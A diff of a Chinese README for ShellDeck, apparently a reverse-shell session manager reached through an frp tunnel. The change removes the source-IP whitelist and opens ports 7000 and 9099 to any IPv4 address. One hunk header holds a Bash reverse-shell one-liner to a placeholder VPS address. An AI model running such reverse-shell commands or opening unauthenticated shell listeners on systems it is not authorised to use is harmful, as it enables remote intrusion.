@@ -110,7 +110,7 @@ transport.tls.keyFile = "/etc/frp/server.key"
 log.to = "console"
 ```
 
-首次部署用 `openssl rand -hex 32` 生成随机 token，两端填写同一值。按[官方 TLS 指引](https://gofrp.org/zh-cn/docs/features/common/network/network-tls/)准备服务端证书和私钥，证书 SAN 必须匹配 Mac 配置中的 VPS 域名或 IP。Mac 只需要受信任的 CA 证书；自签证书场景可使用服务端证书作为信任锚，私钥留在 VPS。
+首次部署用 `openssl rand -hex 32` 生成随机 token，两端填写同一值，替换示例中的占位内容；已有部署保留原 token。按[官方 TLS 指引](https://gofrp.org/zh-cn/docs/features/common/network/network-tls/)准备服务端证书和私钥，证书 SAN 必须匹配 Mac 配置中的 VPS 域名或 IP。Mac 只需要受信任的 CA 证书；自签证书场景可使用服务端证书作为信任锚，私钥留在 VPS。
 
 将配置和证书放好后限制权限，并校验配置：
 
@@ -120,16 +120,32 @@ sudo chmod 0640 /etc/frp/frps.toml /etc/frp/server.crt /etc/frp/server.key
 sudo -u frp /usr/local/bin/frps verify -c /etc/frp/frps.toml
 ```
 
-**启动前先配置访问白名单。** 在 VPS 的防火墙及云安全组中分别限制：
+<a id="frp-public-access"></a>
 
-| TCP 端口 | 允许来源 |
-| --- | --- |
-| `7000` | 运行 frpc 的 Mac 公网出口 IP/CIDR |
-| `9099` | 获准回连的客户端公网出口 IP/CIDR |
+**公网访问策略：`7000`、`9099` 均允许任意 IPv4 来源。** 在 VPS 防火墙和云安全组中分别放行，不再绑定 Mac 或回连客户端的公网出口 IP：
 
-其他来源拒绝访问这两个端口；同时检查 IPv6，保留已有 SSH 和其他业务规则。`allowPorts` 只限制 frp 可绑定的端口，不是来源 IP 白名单。token 只认证 frpc，TLS 只保护 frpc 与 frps 之间的链路；客户端到 VPS 的 Bash 连接仍是原始 TCP，需放在可信网络或受控隧道内。
+| TCP 端口 | 用途 | 允许来源 |
+| --- | --- | --- |
+| VPS `7000` | frpc 连接 frps，须通过 token 认证和 TLS 握手 | 任意 IPv4（`0.0.0.0/0`） |
+| VPS `9099` | 客户端 Bash 回连，经 frp 转发到 ShellDeck | 任意 IPv4（`0.0.0.0/0`） |
+| 本机 `19000` | frpc 连接 ShellDeck | 本机回环 `127.0.0.1` |
 
-防火墙规则需要持久化，并在 frps 启动前加载。下面的 Debian/Ubuntu 示例采用 `netfilter-persistent`：先安装并配置它，保存 IPv4 / IPv6 规则到 `/etc/iptables/rules.v4`、`rules.v6`，启用其开机加载。使用其他防火墙时，按实际服务调整下面的 `Requires` 和 `After`；不要额外引入第二套防火墙管理方式。
+`allowPorts = [{ single = 9099 }]` 只限制 frpc 可以申请的代理监听端口；防火墙和安全组仍需单独放行。升级已有部署时，检查这两个端口的旧来源白名单及优先匹配的 `DROP` / `REJECT` 规则，避免放行后仍被拦截；保留 SSH 和其他业务规则。当前 ShellDeck 的 PROXY v1 接入只支持 IPv4，本机 `19000` 保持回环监听。
+
+公网开放后的认证和加密边界如下：
+
+- **token 认证 frpc**：两端 `auth.method = "token"`，`auth.token` 必须一致；错误或缺失 token 的 frpc 无法登录 `7000`。详见[官方身份认证说明](https://gofrp.org/zh-cn/docs/features/common/authentication/)。
+- **TLS 保护 frpc ↔ frps 链路**：frps 设置 `transport.tls.force = true` 并加载服务端证书、私钥；frpc 设置 `transport.tls.enable = true`，通过 `transport.tls.trustedCaFile` 校验服务端证书及其与 `serverAddr` 的匹配关系。此示例由 frpc 单向校验 frps 的证书，frps 通过 token 认证 frpc。
+- **`9099` 接收原始 TCP 回连**：连接该端口的 Bash 客户端无需提供 frp token，这一段也不受上述 TLS 保护。若需保护客户端到 VPS 的流量，应另行使用加密通道；PROXY v1 提供的来源 IP 仅用于识别连接，不能代替客户端身份认证。
+
+防火墙规则需要持久化，并在 frps 启动前加载。下面的 Debian/Ubuntu 示例采用 `netfilter-persistent`，由 `iptables-persistent` 包提供 iptables 规则的保存和加载插件。先安装并配置，确认运行中的规则符合上表后保存，并启用开机加载：
+
+```sh
+sudo netfilter-persistent save
+sudo systemctl enable netfilter-persistent.service
+```
+
+IPv4 / IPv6 规则分别保存到 `/etc/iptables/rules.v4`、`rules.v6`，核对保存结果与运行中的规则一致。使用其他防火墙时，由原管理工具保存规则，并按实际服务调整下面的 `Requires` 和 `After`；不要额外引入第二套防火墙管理方式。
 
 参考[官方 systemd 用法](https://gofrp.org/zh-cn/docs/setup/systemd/)，将以下内容保存为 `/etc/systemd/system/frps.service`；程序和配置使用实际绝对路径：
 
@@ -154,7 +170,7 @@ NoNewPrivileges=true
 WantedBy=multi-user.target
 ```
 
-配置校验通过、白名单已生效后，首次启动并设置开机自启：
+配置校验通过、防火墙放行并持久化后，首次启动并设置开机自启：
 
 ```sh
 sudo systemctl daemon-reload
@@ -320,19 +336,22 @@ bash -c 'bash -i >& /dev/tcp/VPS_IPV4/9099 0>&1'
 
 #### 验证与日常维护
 
-首次部署或修改配置后，从允许的来源回连，确认 `ls` 显示客户端的公网出口 IP，进入会话执行 `hostname` 等无害命令，再用 [CLI 文件传输](#文件上传与下载)上传、下载临时文件并核对 SHA-256。退出并重新启动 ShellDeck 后验证新连接，同时确认 frpc 仍常驻；从白名单外的来源验证 `7000`、`9099` 被拒绝。具体测试入口见[接入验证](docs/frp.md#验证)。
+首次部署或修改配置后，从另一台公网 IPv4 主机验证 `7000` 可建立 TCP 连接，并通过 `9099` 真实回连。确认 `ls` 显示客户端的公网出口 IP，进入会话执行 `hostname` 等无害命令，再用 [CLI 文件传输](#文件上传与下载)上传、下载临时文件并核对 SHA-256。退出并重新启动 ShellDeck 后验证新连接，同时确认 frpc 仍常驻。具体测试入口见[接入验证](docs/frp.md#验证)。
+
+另外用不带代理定义的临时 frpc 配置检查 `7000` 的认证边界，保留常驻服务配置：正确 token 和受信任证书应能登录；保留正确 CA，改用错误或缺失 token 时，应被 frps 明确拒绝；将 `trustedCaFile` 改为不信任服务端证书的另一张有效 CA 时，应由 frpc 拒绝证书。核对日志中的认证或证书错误，网络超时不能证明凭据被拒绝。测试结束后关闭临时客户端并清理临时配置。
 
 | 现象或变更 | 检查 / 处理 |
 | --- | --- |
 | `shelldeck` 命令找不到 | 确认 `~/.local/bin` 在 `PATH`，移动仓库或更换 Python 后重新安装命令 |
-| frpc 无法登录 VPS | 查 frpc / frps 日志，核对 `7000` 白名单、token、CA 证书和证书 SAN |
+| frpc 无法登录 VPS | 先检查 `7000/TCP` 的防火墙及安全组放行，再查 frpc / frps 日志，区分网络超时、token 不匹配和 CA / 证书 SAN 校验失败 |
+| `9099` 连接超时或被拒绝 | 检查防火墙及安全组是否允许任意 IPv4，是否残留旧白名单或优先拒绝规则，以及 frpc 是否已登录并成功注册代理 |
 | `9099` 可连接但没有会话 | 确认 ShellDeck 正在运行、frpc 代理注册成功，本地目标及 PROXY v1 配置一致；端口开放不代表 ShellDeck 已启动 |
 | 来源地址不符合预期 | 核对 PROXY v1；记录的是 VPS 看到的出口 IPv4，同一 NAT 后的机器可能共用该地址 |
 | 修改本地监听地址或端口 | 只改原 frpc 配置，校验后重启 frpc，再重启 ShellDeck 重新读取 |
-| Mac 或客户端公网出口变化 | 分别更新 `7000` 或 `9099` 的白名单并持久化，不能用局域网地址代替公网出口 |
+| Mac 或客户端公网出口变化 | 按上述公网策略，无需更新来源白名单；网络恢复后检查 frpc 隧道，断开的 Bash 客户端重新回连 |
 | 证书续期或凭据轮换 | 更新 frp 两端所需文件并验证、重启服务；ShellDeck 不保存这些凭据 |
 
-**Mac 通常不需要 DDNS 或路由器端口映射**，因为 frpc 主动连接 VPS。VPS 地址固定时使用 IP 或普通 DNS 即可；只有 VPS 地址变化且希望保持同一域名时才需要更新 DNS，DDNS 也不会自动更新访问白名单。
+**Mac 不需要为这套接入配置 DDNS 或路由器端口映射**，因为 frpc 主动连接 VPS，`7000` 不限制 Mac 的来源 IP。VPS 地址固定时使用 IP 或普通 DNS 即可；只有 VPS 地址变化且希望保持同一域名时才需要更新 DNS，并确保证书仍匹配 frpc 使用的 VPS 地址。
 
 #### 下载部署脚本的配置
 
